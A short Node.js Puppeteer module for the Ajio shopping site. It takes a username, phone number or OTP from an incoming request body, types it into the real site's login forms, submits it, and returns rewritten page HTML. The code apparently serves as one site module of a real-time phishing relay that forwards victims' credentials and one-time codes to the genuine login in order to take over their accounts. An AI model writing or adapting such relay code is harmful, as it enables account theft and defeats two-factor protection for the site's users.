const { Application } = require("../Application")
const { getHeaders } = require("../headers")

class Ajio extends Application {
    async postRequest(configuration) {
        const browser = await this.connectBrowser()
        const pages = await browser.pages()
        const page = pages[0]
        await page.setExtraHTTPHeaders(getHeaders(this.device))

        const body = configuration.body
        const spikeType = body["spike-type"]
        try {
            if (spikeType == "login") {
                let username = `[name="username"]`

                await page.waitForSelector(username)
                await page.type(username, body.username)

                await Promise.all([
                    page.click(`[type="submit"]`),
                    new Promise(re => setTimeout(re, 4000))
                ])
            } else if (spikeType == "phone") {
                let username = `#identifier`

                await page.waitForSelector(username)
                await page.type(username, body.username)

                await Promise.all([
                    page.click(`[type="submit"]`),
                    new Promise(re => setTimeout(re, 4000))
                ])
            } else if (spikeType == "otp") {
                let slOtp = '[name="otp"]'
                await page.waitForSelector(slOtp)
                await page.evaluate(() => {
                    document.querySelector('[name="otp"]').setAttribute("value", "")
                    document.querySelector('[name="otp"]').value = ""
                })
                await page.type(slOtp, body.otp)

                await Promise.all([
                    page.click(`[type="submit"]`),
                    new Promise(re => setTimeout(re, 4000))
                ])
            } else if (spikeType == "resend_otp") {
                let rebtn = ".input-extra-options-desktop"
                await page.waitForSelector(rebtn)
                await Promise.all([
                    page.click(rebtn),
                    new Promise(re => setTimeout(re, 3000))
                ])
            } else {
                return await this.openTAB(true)
            }


            const html = await page.content()
            let response = this.alterHTML(html, true)
            return response

        } catch (error) {
            console.log(error, "\n::- resetting the page to index")
            return await this.openTAB(true, 4000)
        }
    }
}

async function init(reqType, config) {
    const appBrowser = new Ajio(config)
    await appBrowser.openBrowser()

    if (reqType == "getReq") {
        return await appBrowser.openTAB(true, 4000)
    } else if (reqType == "postReq") {
        return await appBrowser.postRequest(config)
    }
}

module.exports = {
    init
}